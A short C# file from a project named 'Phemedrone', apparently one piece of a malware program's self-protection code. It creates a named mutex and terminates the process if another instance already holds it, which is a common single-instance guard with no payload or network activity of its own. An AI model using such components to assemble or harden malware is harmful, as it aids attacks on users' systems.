using System;
using System.Threading;

namespace Phemedrone.Protections
{
    public class MutexCheck
    {
        public static bool Opened;
        public static Mutex Mutex = new Mutex(true, Config.MutexValue, out Opened);

        public static void Check()
        {
            if (!Opened)
            {
                Environment.FailFast("");
            }
        }
    }
}